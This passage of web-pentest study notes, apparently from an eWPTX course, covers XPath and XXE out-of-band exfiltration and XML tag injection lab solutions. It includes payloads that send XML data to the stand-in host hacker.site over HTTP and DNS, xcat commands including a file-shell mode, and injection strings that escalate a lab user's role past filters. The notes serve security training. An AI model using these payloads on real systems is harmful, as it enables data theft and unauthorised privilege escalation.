referrerPolicy="no-referrer"/><pre id="04a7cf7c-be4f-4054-bed9-31fce0d47076" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Advanced data postback through HTTP
+- Arbitrarily read XML/text files on the web server via the **doc() function** and crafted SYSTEM entities (XXE)
+</code></pre><h3 id="c184f314-7d2d-4a36-8182-21a518f364a6" class=""><strong>DNS Channel</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#dns-channel"></a></strong></h3><p id="8c964a9e-4a2f-4a72-9175-6dd52bf1275a" class="">Often the HTTP channel is blocked by firewall or other filters</p><ul id="1df06aea-5ed0-4966-8fc1-cf3f0d913a07" class="bulleted-list"><li style="list-style-type:disc">Usually even when we cant exfiltrate via HTTP, outgoing DNS queries are permitted access to arbitrary hosts.</li></ul><ul id="880418ea-c5e6-4503-8652-55fbc51fcbac" class="bulleted-list"><li style="list-style-type:disc">So, instead of sending data as GET parameters, we use a controlled name server and force the victim site to resolve our domain with they juicy data as subdomain values, like:</li></ul><p id="5e42a2f4-6349-4a07-b620-d75eb54d6cb4" class="">→ http://username.password.hacker.site</p><ul id="d6a0775e-0e1a-43cf-80e9-489876114871" class="bulleted-list"><li style="list-style-type:disc">The length of any one label is limited to between 1 and 63 octets and globally, a full domain name, is limited to 255 octets(including the separators)</li></ul><blockquote id="50faa043-5efd-4279-a6e4-750cc82ff5ca" class="">Since DNS primarily uses UDP, its not guaranteed that requests arrive at the attackers server. Think about network congestion or all the other possibilities that might cause data to get lost.</blockquote><h2 id="34235f7c-a34d-4b0a-8d80-307396a02e23" class=""><strong>Note from Video</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#note-from-video-1"></a></strong></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1006b9a6-f9d9-415f-814d-3da168ed7d60" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">... and count(/*[1]/*)=1
+# find the tree of the XML file
+
+... and substring(name(/*[1],1,1)=&#x27;a&#x27;
+# guess the names
+
+in 2.0 we can use:
+... and string-to-codepoints(/*[1],1,1) &gt; 100
+
+# in this case codepoints.net can help us translate the values to strings
+</code></pre><h3 id="d0f96f3f-7b13-426f-930d-b8db714a6d70" class=""><strong>to exfiltrate via HTTP</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#to-exfiltrate-via-http"></a></strong></h3><p id="4b0d74ab-32b1-43ec-9c38-ba7ad39b8f63" class="">Setup a web server in apache2</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7bd79f8f-e7b7-4716-85ef-ad0a2ca7d5f9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">... and doc(&#x27;http://hacker.site/OOB/test/request&#x27;)
+
+... and doc(concat(&#x27;http://hacker.site&#x27;, &#x27;value1/&#x27;, &#x27;value2&#x27;))
+
+... and doc(concat(&#x27;http://hacker.site&#x27;, name(/*)))
+# to discover the root name xml file
+
+... and doc(concat(&#x27;http://hacker.site&#x27;, name(/*[1]/*[1])))
+# u can discover the full tree name
+
+... and doc-available(concat(&#x27;http://hacker.site&#x27;, encode-for-uri(name(/*[1]/*[1]))))
+
+</code></pre><h3 id="0f876360-8b62-43e8-96a6-698a77173af6" class=""><strong>to exfiltrate via DNS</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#to-exfiltrate-via-dns"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a458bfae-3a24-408a-aaed-215974ec6099" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">apt-get install maradns
+</code></pre><p id="511c9f2d-a0de-4578-90c1-b981a71a1393" class="">Basically we will configure a functioning DNS like *.hacker.site</p><ul id="c29e1aec-8ea8-4125-a705-770327d6e76c" class="bulleted-list"><li style="list-style-type:disc">all subdomains will redirect to hacker.site</li></ul><p id="56205491-4546-4aef-91a9-f0e035fbe6b6" class="">Then we can exfiltrate the values of XML files in the subdomain spaces:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b86a462c-80e9-4526-8891-93d4f0ae84c8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">and doc-available(concat(&#x27;http://&#x27;, name(/*),&#x27;.&#x27;, &#x27;.__.hacker.site&#x27;)
+</code></pre><blockquote id="e97c0aa1-6547-4e61-a7bd-9f821ec788b5" class="">Dont forget the tail -f in the maradns log file to get the results</blockquote><ul id="d8fc967b-bdec-402d-8f0d-52b2ed8dd72c" class="bulleted-list"><li style="list-style-type:disc">if we need to test space or others characters that are not allowed</li></ul><p id="9b8d0aed-04ef-4440-8cf3-f8251afe2804" class="">we need to get the value in codepoints.net and encode like</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a28c33f8-4825-40e5-b957-d95e77560766" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl hello\32world.hacker.site
+</code></pre><h3 id="41ad9810-1063-45d6-a143-80ced6539506" class=""><strong>Using automated Tool</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#using-automated-tool"></a></strong></h3><p id="7661e144-cae1-4cb9-a78a-414a7fe8536f" class="">Xcat:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d175ab1f-4409-4163-86d7-2fc676be4711" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python run_xcat.py --method GET http://xpath.hacker.site title=Code title &quot;Brown&quot; test_injection
+python run_xcat.py --method GET http://xpath.hacker.site title=Code title &quot;Brown&quot; run
+python run_xcat.py --method GET http://xpath.hacker.site title=Code title &quot;Brown&quot; run retrieve //this will retrieve the whole file
+python run_xcat.py --public-ip &quot;127.3.4.5&quot; --method GET http://xpath.hacker.site title=Code title &quot;Brown&quot; run retrieve
+python run_xcat.py --method GET http://xpath.hacker.site title=Code title &quot;Brown&quot; run file_shell
+</code></pre><h2 id="a972e05a-5970-47b0-8f35-71937fc29af5" class=""><strong>Lab 1</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#lab-1"></a></strong></h2><h3 id="945d39de-d0a8-43ff-8dbc-323558fedac8" class=""><strong>Solutions - Lab #1</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-1"></a></strong></h3><p id="891d2c6b-ade3-4393-b478-589a90d101d8" class="">Simple XML TAG injection exploitation warm-up: <em>D0 u w@nn@ b3 a l33t m3mb3r?</em></p><p id="d3a19ca6-5f45-46db-87c3-e5b6b1630267" class="">Background</p><p id="35b523db-1012-40a0-bf49-9056ffef0426" class="">There are two types of users: leet and looser. By default, every new user is a looser. Find a way to become a leet member. Exploitation steps</p><p id="ae94d4e2-b675-44b0-8b8e-ebd6698afc9b" class="">A valid XML structure is reported in the core.js file within the function <code>WSregister__old</code>.</p><p id="12c5e283-5689-4c55-bff4-820673426743" class="">As you can see in the previous implementation, the developers used a different approach that helps us to detect the XML structure in this scenario.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dda4f5a4-a7df-43fd-bd9d-afcbce3f2610" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">function WSregister__old() {
+...
+  var xml = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &#x27;;
+  xml += &#x27;&lt;user&gt;                                    &#x27;;
+  xml += &#x27;    &lt;role&gt;2&lt;/role&gt;                        &#x27;;
+  xml += &#x27;    &lt;name&gt;&#x27; + name + &#x27;&lt;/name&gt;             &#x27;;
+  xml += &#x27;    &lt;username&gt;&#x27; + username + &#x27;&lt;/username&gt; &#x27;;
+  xml += &#x27;    &lt;password&gt;&#x27; + password + &#x27;&lt;/password&gt; &#x27;;
+  xml += &#x27;&lt;/user&gt;                                   &#x27;;
+...
+}
+</code></pre><p id="8e64f1eb-c344-475a-a2ec-adc6251ce4ad" class="">Testing parameter name Registering:</p><ul id="d5a994ec-7aed-4661-a11b-ed5100b7be4b" class="bulleted-list"><li style="list-style-type:disc">If we register a user, we can see that its name is echoed back in the welcome message and is encoded with htmlspecialchars.</li></ul><ul id="0e813f3f-dbe0-4eaf-8c1f-770062043269" class="bulleted-list"><li style="list-style-type:disc">Furthermore, if we try to inject some tags (e.g., ), the application works and registers the new user. Therefore, this parameter is not injectable.</li></ul><p id="f8b0fba2-db0a-4bf3-8c85-dfcde10bbcf0" class="">Testing parameter password:</p><ul id="1c48e246-8e5a-49c8-b5e7-bb2529020e7a" class="bulleted-list"><li style="list-style-type:disc">If we adopt the same approach with the password, we can see that even the password is not injectable!</li></ul><p id="2ec80d85-9d88-4af6-ae27-36222311d09a" class="">Testing parameter username:</p><ul id="edae9a63-fce0-4b83-b3e2-bac8f3f89806" class="bulleted-list"><li style="list-style-type:disc">The only injectable parameter is the username.</li></ul><p id="d6d30c14-5314-42a8-8245-906ce2726160" class="">If we take advantage of the XML structure found in the core.js file we could easily inject our leet user as follows:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3d3ce0c8-c95a-413d-b1dc-b83e4ddc1dee" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">name:     useless
+username: useless&lt;/username&gt;&lt;/user&gt;&lt;user&gt;&lt;rule&gt;1&lt;/rule&gt;&lt;name&gt;l33t&lt;/name&gt;&lt;username&gt;l33t
+password: l33t
+
+The leet login will be:
+
+username: l33t
+password: l33t
+</code></pre><h3 id="3795c053-ba00-412f-b3b8-1d1cd35cf2f7" class=""><strong>Solutions - Lab #2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-2"></a></strong></h3><p id="0710513c-eb49-4016-aec0-f081e93f6234" class="">Simple XML TAG injection exploitation with length limitation: <em>Does Length Matter?</em></p><p id="f0c385e5-1355-4dcf-b34d-1b456abf4cab" class="">Background</p><p id="ed01f1fc-5484-4049-b77d-5aad7fac8d00" class="">There are two types of users: leet and looser. By default, every new user is a looser. Find a way to become a leet member. Exploitation steps</p><p id="efd983af-1003-450c-87e9-bdc6b2ef3589" class="">A valid XML structure is reported in the core.js file within the function WSregister__old.</p><p id="441d4b3c-96a6-4132-8418-228489b5af67" class="">As you can see in the previous implementation, the developers used a different approach than in this scenario, which helps us detect the XML structure:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e2533cfc-f1c5-4817-aaa3-e4e0ac150371" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">function WSregister__old() {
+  ...
+  var xml = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &#x27;;
+  xml += &#x27;&lt;user&gt;                                    &#x27;;
+  xml += &#x27;    &lt;role&gt;2&lt;/role&gt;                        &#x27;;
+  xml += &#x27;    &lt;name&gt;&#x27; + name + &#x27;&lt;/name&gt;             &#x27;;
+  xml += &#x27;    &lt;username&gt;&#x27; + username + &#x27;&lt;/username&gt; &#x27;;
+  xml += &#x27;    &lt;password&gt;&#x27; + password + &#x27;&lt;/password&gt; &#x27;;
+  xml += &#x27;&lt;/user&gt;                                   &#x27;;
+  ...
+}
+</code></pre><p id="c7353519-b8ac-4a56-9bad-702f2dafca03" class="">Testing parameter name:</p><ul id="cd670171-cdaa-4446-9274-d78850766b20" class="bulleted-list"><li style="list-style-type:disc">Registering a test user, we can see that the name of the new user is echoed back in the welcome message and is encoded with htmlspecialchars.</li></ul><p id="bedeb7af-0f91-457c-b335-a6bc6c8dafa9" class="">If we try to inject some tags (e.g., ), the application returns an error message:</p><ul id="ccbcec43-98ec-4fa2-9d66-e2cd0e243632" class="bulleted-list"><li style="list-style-type:disc">Opening and ending tag mismatch …</li></ul><p id="88133198-19bf-4b48-8615-4fcdcefb1544" class="">Testing parameter username:</p><ul id="6b168cdc-e509-40b6-b0ba-929d6f9fe017" class="bulleted-list"><li style="list-style-type:disc">If we adopt the same approach as before, we can see that even the username is injectable!</li></ul><p id="fa8c2c81-214d-4def-9e7a-3589e4d00feb" class="">Testing parameter password:</p><ul id="f2906ad3-8740-447d-9644-1975272ad7db" class="bulleted-list"><li style="list-style-type:disc">If we adopt the same approach as before, we can see that the password is not injectable!</li></ul><p id="aa3a7c86-ee5b-4cf6-9354-6180f4f44aa3" class="">Length limitations:</p><ul id="9e520673-145c-4f94-bba0-a0460f0ccf62" class="bulleted-list"><li style="list-style-type:disc">We notice that the name and username have length limitations of 35 characters.</li></ul><blockquote id="f77c32c4-fc0b-423b-81fc-81ff88097166" class="">In fact, if we try to inject something longer, the application cuts/truncates our input.</blockquote><p id="16308b4a-9ad5-4db8-9551-2aded4a828c2" class="">Since we have two injection points, to bypass this limitation we can split and inject our payload in the two places:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b4c02f85-2db1-43b0-ba0b-23a9f4a2c76a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">name:     &lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule&gt;1&lt;!--
+username: -- &gt;&lt;/rule&gt;&lt;name&gt;x&lt;/name&gt;&lt;username&gt;x
+password: l33t
+
+The leet login will be:
+
+username: x
+password: l33t
+</code></pre><h3 id="754a100c-1671-46f8-bbc4-27b77afebd3a" class=""><strong>Solutions - Lab #3</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-3"></a></strong></h3><p id="6460e449-c50d-4d8a-93c9-92923f48f301" class="">XML TAG injection exploitation with length limitation and filters: <em>If youre tired .. have a break!</em></p><p id="fb7bb508-70d9-405d-ab7d-5b4aa675ae20" class="">Background</p><p id="7ada94d3-9cea-47e5-9267-65f8b1cc1b75" class="">There are two types of users: leet and looser. By default, every new user is a looser. Find a way to become a leet member. Exploitation steps</p><p id="e8539058-88c6-49a0-ab24-0fede5b27219" class="">A valid XML structure is reported in the core.js file within the function WSregister__old.</p><p id="d6b0291d-6449-488d-b4bd-2e40ab9cdffd" class="">As you can see in the previous implementation, the developers used a different approach than in this scenario, which helps us detect the XML structure.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a1a6160b-fcd7-479c-94b0-e2ecd04ce9f0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">function WSregister__old() {
+  ...
+  var xml = &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &#x27;;
+  xml += &#x27;&lt;user&gt;                                    &#x27;;
+  xml += &#x27;    &lt;role&gt;2&lt;/role&gt;                        &#x27;;
+  xml += &#x27;    &lt;name&gt;&#x27; + name + &#x27;&lt;/name&gt;             &#x27;;
+  xml += &#x27;    &lt;username&gt;&#x27; + username + &#x27;&lt;/username&gt; &#x27;;
+  xml += &#x27;    &lt;password&gt;&#x27; + password + &#x27;&lt;/password&gt; &#x27;;
+  xml += &#x27;&lt;/user&gt;                                   &#x27;;
+  ...
+}
+</code></pre><p id="7d0dd645-8c73-4689-9b5b-9a0d18ff9d12" class="">Testing parameter name:</p><ul id="2d38ace7-c9dd-4e93-906b-e569201adb50" class="bulleted-list"><li style="list-style-type:disc">Registering a test user, we can see that the name of the new user is echoed back in the welcome message and is encoded with htmlspecialchars. But, if we try to inject some tags (e.g., ),</li></ul><p id="0c3a9688-1645-48d5-9c41-eb023e921bb1" class="">The application returns an error message like the following:</p><ul id="391646bd-8b85-4f4e-ae5b-ddfdcaee51f0" class="bulleted-list"><li style="list-style-type:disc">Opening and ending tag mismatch …</li></ul><p id="1a555dca-e1ce-46c8-bbb3-3cd94887cdef" class="">Testing parameter name:</p><ul id="a4b288d4-8b95-4582-ba95-6f979bcbda45" class="bulleted-list"><li style="list-style-type:disc">If we adopt the same approach as before, we can see that even the username is injectable!</li></ul><p id="a7a0c01e-cac4-4ddd-813e-bb6add5c47c0" class="">Testing parameter password:</p><ul id="3453bf89-dfed-46a7-8d28-dd153720f77f" class="bulleted-list"><li style="list-style-type:disc">If we adopt the same approach as before, we can see that the password is not injectable!</li></ul><p id="1449a24a-ad83-42d9-8f99-798a5556f883" class="">Length limitations:</p><ul id="3b22ad5e-e113-45ec-83d8-91de91ebc6e2" class="bulleted-list"><li style="list-style-type:disc">We notice that name and username have length limitations of 34 characters.</li></ul><blockquote id="c8de3a0a-f48d-464b-8a1e-b3e5e7d621c6" class="">In fact, if we try to inject something longer, the application cuts/truncates our input.</blockquote><p id="b30fad00-3c18-44ca-9d07-43d8b75e1594" class="">Since we have two injection points, to bypass this limitation we can split and inject our payload in the two places:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6af6572f-08f4-4701-99a4-c14647abf82f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">name:     &lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule&gt;1&lt;!--
+username: --&gt;&lt;/rule&gt;&lt;name&gt;&lt;/name&gt;&lt;username&gt;x
+password: l33t
+</code></pre><p id="d0c45c93-e701-4b3a-8d70-2437ee68f1de" class="">Bypassing Filters:</p><ul id="89c57059-19a0-44e7-861b-808a35428222" class="bulleted-list"><li style="list-style-type:disc">Bypassing length limitations is not enough. The application implements some filters against the XML TAG injection that blocks the previous payload.</li></ul><p id="f25577cb-5afb-4163-a9e9-7cefee87c7a4" class="">In this case, if the filter detects some dangerous elements, it shows a message like the following:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="832b4c54-e5c1-41de-bc4e-468ef5d8db9d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">So you wanna be a l33t member so easily?! ಠ_ಠ
+
+# Injecting some metacharacters, we can see that &amp;, \ , , , &quot;&quot; , &#x27;&#x27; are filtered but &lt; and &gt; are not!
+</code></pre><p id="e74b5b5a-2b38-42e0-b790-3344cbb06809" class="">There is another filter that blocks the and tags.</p><p id="8b430190-1f31-4344-9dce-77e8904cf272" class="">The check is case-insensitive, and it seems that spaces and tabs are ignored between the tag name and the close tag character, but if we inject a new line, it is not filtered!</p><p id="169b3de9-b2d9-4b06-b5ea-5600968b1544" class="">So the exploitation could be the following:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b39c048c-5137-465e-b132-d19b32be2444" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">name:     &lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule{NEW_LINE}&gt;1&lt;!--
+username: --&gt;&lt;/rule{NEW_LINE}&gt;&lt;name&gt;&lt;/name&gt;&lt;username&gt;x
+password: l33t
+</code></pre><p id="39d7dda1-a153-489f-b259-d1bce8c37848" class="">Now the username has a length of 35; injecting this payload, we would have an empty username and thus an invalid login.</p><ul id="9b225cc1-86ee-47cf-9e0f-cb05e63605a4" class="bulleted-list"><li style="list-style-type:disc">We need to remove something from the payload, and the tag seems to be ignored server-side.</li></ul><p id="7e56cd75-1311-4400-b9d9-9da48d94803c" class="">The working exploit is:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="48006f60-6203-4d1d-a6d7-30878aacc6e8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">name:     &lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule{NEW_LINE}&gt;1&lt;!--
+username: --&gt;&lt;/rule{NEW_LINE}&gt;&lt;username&gt;l33t
+password: l33t
+</code></pre><p id="aef055f3-3d9b-4ab8-b254-e8ccf29bb83e" class="">Inside burp the request should look as follows:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f9ac9d32-c313-4783-9706-c551c94f9e21" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">POST /add_new.php HTTP/1.1
+...
+name=&lt;/name&gt;&lt;/user&gt;&lt;user&gt;&lt;rule
+&gt;1&lt;!--&amp;user=--&gt;&lt;/rule
